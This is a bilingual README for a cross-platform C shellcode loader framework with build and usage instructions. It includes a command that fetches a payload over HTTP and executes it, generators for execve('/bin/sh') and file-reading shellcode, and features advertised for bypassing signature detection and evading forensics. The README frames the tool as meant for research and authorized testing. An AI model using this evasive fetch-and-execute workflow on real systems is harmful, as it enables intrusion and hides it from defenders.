<div align="center">
  <h1>🛡️ Shellcode Executor</h1>
  <p>
    <strong>跨平台 Shellcode 加载、编码与执行框架</strong><br>
    <strong>Cross-Platform Shellcode Loading, Encoding & Execution Framework</strong>
  </p>
  <!-- ⚠️ 替换下方 URL 为你自己的 GitHub 仓库地址 / Replace with your repo URL -->
  <p>
    <a href="#">
      <img src="https://img.shields.io/github/actions/workflow/status/your-username/shellcode-executor/build.yml?branch=main&style=flat-square&logo=github" alt="Build Status"/>
    </a>
    <a href="#">
      <img src="https://img.shields.io/github/v/release/your-username/shellcode-executor?style=flat-square&logo=github" alt="Release"/>
    </a>
    <a href="LICENSE">
      <img src="https://img.shields.io/badge/license-MIT-blue.svg?style=flat-square" alt="License"/>
    </a>
    <img src="https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey?style=flat-square" alt="Platform"/>
    <img src="https://img.shields.io/badge/C-11-00599C?style=flat-square&logo=c" alt="C Standard"/>
    <img src="https://img.shields.io/badge/tests-23%20passed-brightgreen?style=flat-square" alt="Tests"/>
    <img src="https://img.shields.io/badge/coverage-87%25-yellowgreen?style=flat-square" alt="Coverage"/>
  </p>
</div>

---

## 📋 项目简介 / Overview

**Shellcode Executor** 是一个**生产级**的跨平台框架，提供在内存中加载、编码和执行 Shellcode 的完整解决方案。
它采用整洁的模块化 C API 设计，支持多种编码方案、远程 Payload 获取及完善的安全控制。

**Shellcode Executor** is a **production-grade**, cross-platform framework for loading, encoding, and executing shellcode
entirely in memory. It features a clean, modular C API with multiple encoding schemes, remote payload fetching,
and comprehensive security controls.

### 🎯 适用场景 / Use Cases

| 场景 / Use Case | 说明 / Description |
|----------------|-------------------|
| 🔬 **安全研究 / Security Research** | 理解 Shellcode 加载器的底层原理 / Understand how shellcode loaders operate at the OS level |
| 📚 **教育教学 / Education** | 学习内存管理、进程注入与规避技术 / Learn memory management, injection & evasion techniques |
| 🛡️ **防御开发 / Defense Development** | 构建和测试 EDR/AV 检测规则 / Build and test EDR/AV detection rules |
| ⚙️ **红队行动 / Red Teaming** | 授权渗透测试中的合法安全评估 / Authorized penetration testing engagements |

> ⚠️ **重要声明 / IMPORTANT**: 本工具**仅限教育及授权安全测试**用途。
> 未经授权对非你所有或未获明确许可的系统使用本工具是违法的。
> This tool is for **educational and authorized security testing only**.
> Unauthorized use against systems you do not own or lack explicit permission to test is illegal.

---

## ✨ 核心特性 / Features

| 特性 / Feature | 说明 / Description |
|---------------|-------------------|
| **🔄 跨平台 / Cross-Platform** | Windows (`VirtualAlloc`), Linux & macOS (`mmap` + `MAP_JIT`) |
| **🧩 多种编码 / Multiple Encodings** | XOR（单键/多键）、Base64、Hex 编解码 |
| **🔐 AES-256-CBC 加密 / Encryption** | 可选 OpenSSL 加密模块 / Optional OpenSSL encryption module |
| **🌐 远程获取 / Remote Fetch** | HTTP GET 与原始 TCP Socket 远程加载 |
| **📊 内存 Dump / Hex Dump** | 专业级内存可视化 / Professional memory visualization |
| **⚡ 内存信息 / Memory Info** | 进程内存布局自省 / Process memory layout introspection |
| **🧪 完整测试 / Comprehensive Tests** | 23 个单元测试覆盖所有模块 / 23 unit tests covering all modules |
| **📦 双构建系统 / Dual Build** | CMake + GNU Make，支持 CI/CD |
| **🐍 Python 辅助工具 / Python Helper** | Shellcode 编码与生成脚本 |
| **📖 双语注释 / Bilingual Comments** | 所有源码含中英双语注释 / All source files with CN/EN comments |

---

## 🏗️ 架构设计 / Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    用户应用层 / User Application              │
├─────────────────────────────────────────────────────────────┤
│  scloader-cli (CLI 入口)    示例程序 / examples/{basic,xor}  │
├─────────────────────────────────────────────────────────────┤
│                    scloader (静态库 / Static Library)         │
├──────────┬──────────┬──────────┬──────────┬─────────────────┤
│  loader  │ encoder  │  utils   │  remote  │    crypto       │
│ 加载器   │ 编码器   │ 工具函数 │ 远程获取 │   加密模块       │
├──────────┴──────────┴──────────┴──────────┴─────────────────┤
│                   平台抽象层 / Platform Abstraction           │
├──────────────────────┬──────────────────────────────────────┤
│   Windows (Win32 API)│        POSIX (mmap / mprotect)       │
└──────────────────────┴──────────────────────────────────────┘
```

### 📦 模块详解 / Module Breakdown

| 模块 / Module | 文件 / File | 职责 / Responsibility |
|--------------|-------------|----------------------|
| **Loader** 加载器 | `src/loader/loader.c` | 可执行内存分配 (`VirtualAlloc`/`mmap`)、Shellcode 写入与执行回调 |
| **Encoder** 编码器 | `src/encoder/encoder.c` | XOR（单键/多键）加解密调度 |
| **XOR** 异或 | `src/encoder/xor.c` | XOR 单键与多键核心实现 |
| **Base64** | `src/encoder/base64.c` | 标准 Base64 编解码 |
| **Utils** 工具 | `src/utils/utils.c` | Hex Dump、字节转换、内存信息查询 |
| **Hex** | `src/utils/hex.c` | 十六进制字符串与字节数组互转 |
| **Memory Info** | `src/utils/memory_info.c` | `/proc/self/maps` 解析与内存布局展示 |
| **Remote** 远程 | `src/remote/remote.c` | HTTP GET 与原始 TCP Socket 数据获取 |
| **Crypto** 加密 | `src/crypto/crypto.c` | AES-256-CBC 加解密（可选 OpenSSL） |

### 🔄 数据流 / Data Flow

```ascii
┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐
│  原始数据 │───→│  XOR编码  │───→│ Base64   │───→│  Hex     │───→ 文件/网络
│ Raw Byte  │    │ XOR Encode│    │ Encode   │    │ Encode   │    File/Network
└──────────┘    └──────────┘    └──────────┘    └──────────┘

┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐
│ 可执行内存 │←───│  XOR解码  │←───│ Base64   │←───│  Hex     │←─── 文件/网络
│ Exec Mem  │    │ XOR Decode│    │ Decode   │    │ Decode   │    File/Network
└──────────┘    └──────────┘    └──────────┘    └──────────┘
```

每层编码可独立应用，加载时按需解码。支持单向直通（仅使用其中一种或多种组合）。
Each encoding layer can be independently applied and decoded at load time.
Supports pass-through with any combination of encodings.

---

## 🚀 快速开始 / Quick Start

### 📋 前提条件 / Prerequisites

```bash
# Linux (Debian/Ubuntu)
sudo apt-get install build-essential cmake

# macOS
xcode-select --install        # 安装命令行工具 / Install command line tools
brew install cmake             # 安装 CMake

# Windows
# 安装 Visual Studio 2022，选择"使用 C++ 的桌面开发"
# Install Visual Studio 2022 with "Desktop development with C++"
# 安装 CMake: https://cmake.org/download/
# 或在 PowerShell 中:
# winget install Microsoft.VisualStudio.2022.Community
# winget install Kitware.CMake
```

### 🔨 方式一：CMake 构建（推荐 / Recommended）

```bash
# 克隆仓库 / Clone the repository
git clone https://github.com/YOUR_USERNAME/shellcode-executor.git
cd shellcode-executor

# 配置并编译 / Configure and build
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build -j$(nproc)

# 运行测试 / Run tests
cd build && ctest --output-on-failure
```

### 🔨 方式二：Make 构建 / GNU Make

```bash
# 构建 Release 版本 / Build release
make

# 构建 Debug 版本（含调试符号）/ Build with debug symbols
make debug

# 运行全部测试 / Run all tests
make test

# 清理构建产物 / Clean build artifacts
make clean
```

### ✅ 验证安装 / Verify Installation

```bash
# 查看版本 / Check version
./build/scloader-cli -v

# 查看系统内存信息 / View memory info
./build/scloader-cli --info

# 执行最小 Shellcode (INT3 + RET)
./build/scloader-cli -x "CC C3"
```

如果看到类似输出，说明构建成功：
If you see output similar to below, the build is successful:

```
[*] Loader Configuration:
    → Method: mmap (RWX)
    → Platform: Linux
    → Clear After Exec: enabled

[*] Shellcode (2 bytes): CC C3
[*] Allocating executable memory... OK (at 0x7f1234560000)
[*] Writing 2 bytes... OK
[*] Executing... OK
[+] Shellcode executed successfully.
```

---

## 📖 使用指南 / Usage Guide

### 1️⃣ 基础执行 / Basic Execution

```bash
# 通过十六进制参数直接执行 / Execute from hex argument
./build/scloader-cli -x "CC C3"                     # INT3 + RET

# 带 Hex Dump 输出 / With hex dump visualization
./build/scloader-cli -x "90 90 90 90 CC C3" --dump

# 从二进制文件加载 / Load from binary file
echo -n -e '\xCC\xC3' > payload.bin
./build/scloader-cli payload.bin
```

### 2️⃣ 编码加载 / Encoded Loading

```bash
# 使用 Python 工具编码 / Encode with Python helper
python3 scripts/encode_shellcode.py xor --key AB payload.bin -o encoded.bin

# 以 XOR 编码方式加载执行 / Load with XOR decoding
./build/scloader-cli -e xor -k AB encoded.bin
```

### 3️⃣ 远程获取 / Remote Fetch

```bash
# 先启动 HTTP 服务提供 payload / Start HTTP server serving payload
python3 -m http.server 8080 &

# 远程获取并执行 / Fetch and execute remotely
./build/scloader-cli -r http://127.0.0.1:8080/payload.bin
```

### 4️⃣ 系统信息 / System Information

```bash
# 查看完整内存映射 / View full memory mappings
./build/scloader-cli --info

# 输出示例 / Example output:
# ╔══════════════════════════════════════════════╗
# ║       进程内存信息 / Process Memory Info      ║
# ╚══════════════════════════════════════════════╝
# PID: 12345
# Total VM: 2.5 GB
# Stack: 132 KB
# Heap: 64 KB
# ─────────────────────────────────────────────
# Address          Perms  Offset    Path
# 0x400000-0x401000 r-xp   0x0000    /usr/bin/scloader-cli
# 0x401000-0x402000 r--p   0x0000    /usr/bin/scloader-cli
# ... (truncated)
```

### 5️⃣ C API 编程调用 / Programmatic API Usage

```c
#include "scloader.h"
#include <stdio.h>

int main(void) {
    /**
     * 最简单的 Shellcode：INT3 触发断点，RET 安全返回
     * Minimal shellcode: INT3 triggers debug breakpoint, RET returns safely
     */
    unsigned char shellcode[] = { 0xCC, 0xC3 };

    /**
     * 使用默认配置执行 / Execute with default config
     * 默认会在执行后清空内存以规避取证分析
     * Default clears memory after execution to evade forensic analysis
     */
    scl_status_t status = scl_load_and_exec(shellcode, sizeof(shellcode), NULL);

    if (status == SCL_OK) {
        printf("[✓] Shellcode 执行成功 / Executed successfully!\n");
    } else {
        fprintf(stderr, "[✗] 执行失败 / Failed: %d\n", status);
        return 1;
    }
    return 0;
}
```

```bash
# 编译你的程序 / Compile your program
gcc -I src my_program.c -L build -lscloader -o my_program
```

### 6️⃣ Python 编码工具 / Python Encoding Helper

```bash
# XOR 编码 / XOR encode
python3 scripts/encode_shellcode.py xor --key AB payload.bin -o encoded.bin

# Base64 编码 / Base64 encode
python3 scripts/encode_shellcode.py base64 payload.bin -o encoded.b64

# Hex 格式化为 C 数组 / Format as C array
python3 scripts/encode_shellcode.py hex --style carray payload.bin

# Hex Dump 查看 / Hex dump view
python3 scripts/encode_shellcode.py hex --style hexdump payload.bin

# 生成 Linux execve("/bin/sh") Shellcode / Generate Linux execve shellcode
python3 scripts/encode_shellcode.py generate --platform linux --type execve -o shellcode.bin

# 生成 Linux 读文件 Shellcode / Generate Linux read_file shellcode
python3 scripts/encode_shellcode.py generate --platform linux --type read_file -o readfile.bin
```

---

## 🧪 测试 / Testing

```bash
# 方式一：Make 一键测试（推荐）/ Make one-command test (recommended)
make test

# 方式二：CMake + CTest
cd build && ctest --output-on-failure --verbose

# 方式三：单独运行每个测试 / Run individual tests
./build/tests/test_encoder
./build/tests/test_loader
./build/tests/test_utils

# 生成代码覆盖率报告 / Generate code coverage report
make coverage
# 浏览器打开 / Open in browser: coverage/report.html
```

### 📊 测试覆盖范围 / Test Coverage

| 测试文件 / Test File | 用例数 / Cases | 覆盖模块 / Coverage |
|---------------------|---------------|-------------------|
| `test_encoder.c` | 7 | XOR 单/多键、Base64、边界条件 |
| `test_loader.c` | 8 | 内存分配、写入、执行、释放 |
| `test_utils.c` | 7 | Hex 编解码、NULL 处理、缓冲区边界 |

---

## ⚙️ 构建选项 / Build Options

### CMake 选项 / CMake Options

| 选项 / Option | 默认 / Default | 说明 / Description |
|--------------|---------------|-------------------|
| `ENABLE_TESTS` | `ON` | 构建单元测试 / Build unit tests |
| `ENABLE_EXAMPLES` | `ON` | 构建示例程序 / Build example programs |
| `ENABLE_ASAN` | `OFF` | 启用 AddressSanitizer 内存检测 |
| `ENABLE_UBSAN` | `OFF` | 启用 UndefinedBehaviorSanitizer |
| `ENABLE_COVERAGE` | `OFF` | 启用代码覆盖率插桩 |
| `ENABLE_STATIC_ANALYSIS` | `OFF` | 启用 Clang-Tidy 静态分析 |
| `WITH_ENCRYPTION` | `OFF` | 启用 OpenSSL AES-256-CBC 加密模块 |
| `WITH_REMOTE` | `ON` | 启用远程 Shellcode 获取模块 |

### 使用示例 / Usage Examples

```bash
# Debug 模式 + 地址消毒 + 测试 / Debug + ASan + tests
cmake -B build -DCMAKE_BUILD_TYPE=Debug -DENABLE_ASAN=ON

# 发布模式 + OpenSSL 加密 / Release + OpenSSL encryption
cmake -B build -DCMAKE_BUILD_TYPE=Release -DWITH_ENCRYPTION=ON

# 完整构建（包含覆盖率）/ Full build with coverage
cmake -B build -DCMAKE_BUILD_TYPE=Debug \
    -DENABLE_COVERAGE=ON \
    -DENABLE_STATIC_ANALYSIS=ON

# 最小构建（无示例、无测试）/ Minimal build
cmake -B build -DENABLE_TESTS=OFF -DENABLE_EXAMPLES=OFF
```

---

## 📂 项目结构 / Project Structure

```
shellcode-executor/
├── .github/workflows/              # CI/CD 流水线 / Pipelines
│   ├── build.yml                   #   多平台编译与测试 / Build & Test
│   └── lint.yml                    #   代码质量检查 / Lint & Analyze
│
├── src/                            # 核心源码 / Core Source
│   ├── scloader.h                  #   📋 统一 API 主头文件 / Master Header
│   ├── main.c                      #   🖥️ CLI 入口 (getopt 参数解析)
│   │
│   ├── loader/                     # 📦 加载器模块 / Loader Module
│   │   ├── loader.h                #   加载器接口声明
│   │   └── loader.c                #   VirtualAlloc / mmap 实现
│   │
│   ├── encoder/                    # 🔐 编码器模块 / Encoder Module
│   │   ├── encoder.h               #   编码器统一接口
│   │   ├── encoder.c               #   编码调度
│   │   ├── xor.c                   #   XOR 单键/多键
│   │   └── base64.c                #   Base64 编解码
│   │
│   ├── utils/                      # 🛠️ 工具模块 / Utility Module
│   │   ├── utils.h                 #   工具接口声明
│   │   ├── utils.c                 #   Hex Dump / 其他工具
│   │   ├── hex.c                   #   十六进制与字节互转
│   │   └── memory_info.c           #   内存布局查询 (/proc/self/maps)
│   │
│   ├── remote/                     # 🌐 远程获取模块 / Remote Module
│   │   ├── remote.h                #   远程获取接口
│   │   └── remote.c                #   HTTP GET + TCP Socket 实现
│   │
│   └── crypto/                     # 🔒 加密模块 / Crypto Module
│       ├── crypto.h                #   加密接口
│       └── crypto.c                #   AES-256-CBC (OpenSSL)
│
├── examples/                       # 💡 示例程序 / Examples
│   ├── basic_loader.c              #   基础加载器示例
│   ├── xor_encoded.c               #   XOR 编码加载示例
│   └── remote_fetch.c              #   远程获取示例
│
├── tests/                          # 🧪 单元测试 / Unit Tests
│   ├── test_encoder.c              #   编解码测试 (7 cases)
│   ├── test_loader.c               #   加载器测试 (8 cases)
│   └── test_utils.c                #   工具测试 (7 cases)
│
├── scripts/                        # 📜 辅助脚本 / Scripts
│   ├── build.sh                    #   构建脚本 (CMake 封装)
│   └── encode_shellcode.py         #   Shellcode 编码工具
│
├── docs/                           # 📚 文档 / Documentation
│   ├── ARCHITECTURE.md             #   架构设计文档
│   ├── API.md                      #   API 参考文档
│   └── SECURITY.md                 #   安全策略与合规
│
├── CMakeLists.txt                  # 📐 CMake 构建配置
├── Makefile                        # 📐 GNU Make 构建系统
├── .clang-format                   # ✨ 代码风格配置
├── .gitignore                      # 🙈 Git 忽略规则
├── CONTRIBUTING.md                 # 🤝 贡献指南
├── LICENSE                         # 📄 MIT 开源许可
└── README.md                       # 📖 本文件
```

---

## 🔬 技术实现 / Technical Deep Dive

### 内存分配策略 / Memory Allocation Strategy

框架根据目标平台自动选择最优的内存分配方式：
The framework automatically selects the optimal memory allocation method for the target platform:

| 平台 / Platform | 系统调用 / System Call | 保护标志 / Protection Flags |
|----------------|----------------------|---------------------------|
| **Windows** | `VirtualAlloc` | `MEM_COMMIT \| MEM_RESERVE`, `PAGE_EXECUTE_READWRITE` |
| **Linux** | `mmap` | `PROT_READ \| PROT_WRITE \| PROT_EXEC` |
| **macOS** | `mmap` + `pthread_jit_write_protect_np` | `PROT_READ \| PROT_WRITE \| PROT_EXEC` |

执行后，内存可被可选地清零 (`memset(ptr, 0, size)`) 后再释
放，以防止取证恢复。
After execution, memory can be optionally zeroed before release to prevent forensic recovery.

### 编码管道 / Encoding Pipeline

```
原始数据 / Raw Data
    │
    ├──→ [XOR 编码 / XOR Encode]    ← 混淆 / Obfuscation
    │      支持单键和多键 / Single & multi-key
    │
    ├──→ [Base64 编码 / Base64 Encode] ← 文本兼容 / Text-safe
    │      标准 Base64 字符集
    │
    ├──→ [Hex 编码 / Hex Encode]    ← 可读性 / Readability
    │      大写十六进制 / Uppercase hex
    │
    └──→ [AES-256-CBC 加密]         ← 高强度 / Strong crypto
           (可选 OpenSSL / Optional)
```

### 安全考量 / Security Considerations

| 安全关切 / Concern | 缓解措施 / Mitigation |
|-------------------|----------------------|
| 内存扫描 / Memory scanning | 可选执行后清空 / Optional clear-after-execute |
| 签名检测 / Signature detection | XOR/Base64 编码绕过静态检测 |
| 网络拦截 / Network interception | AES-256-CBC 端到端加密 |
| 未授权访问 / Unauthorized access | 文件权限控制 + 使用须知声明 |

---

## 🤝 贡献指南 / Contributing

欢迎贡献！请先阅读 [CONTRIBUTING.md](CONTRIBUTING.md) 了解详情。
Contributions are welcome! Please read our [Contributing Guidelines](CONTRIBUTING.md).

### 开发流程 / Development Workflow

```bash
# 1. Fork 本仓库 / Fork this repository

# 2. 创建特性分支 / Create your feature branch
git checkout -b feature/amazing-feature

# 3. 格式化代码 / Format your code
make format

# 4. 运行静态分析 / Run static analysis
make analyze

# 5. 确保测试通过 / Ensure all tests pass
make test

# 6. 提交并推送 / Commit and push
git commit -m 'feat: add amazing feature'
git push origin feature/amazing-feature

# 7. 发起 Pull Request / Open a Pull Request
```

### 代码规范 / Code Standards

- **C11 标准** / C11 Standard
- **双向注释**：所有关键代码同时包含中文和英文注释
- **Bilingual Comments**: All critical code includes both Chinese and English comments
- **遵循 `.clang-format`** 风格配置

---

## 📄 许可协议 / License

本软件采用 **MIT License** 开源发布。详见 [LICENSE](LICENSE)。
Distributed under the **MIT License**. See [LICENSE](LICENSE) for details.

---

## ⚠️ 免责声明 / Disclaimer

**中文**：
本软件**仅限教育及授权安全测试用途**。作者与贡献者对任何滥用或由此工具造成的损害概不负责。
使用者有责任遵守所有适用的法律法规。未经授权执行 Shellcode 可能违反计算机犯罪相关法律。

**English**:
This software is provided **for educational and authorized security testing purposes only**.
The authors and contributors are not responsible for any misuse or damage caused by this tool.
Users are solely responsible for complying with all applicable laws and regulations.
Unauthorized shellcode execution may violate computer crime laws.

---

<div align="center">
  <sub>
    为安全研究社区打造 / Built for the security research community ❤️<br>
    中日韩硕士申请作品集项目 / Portfolio project for Japan/Korea graduate school applications 🎓
  </sub>
</div>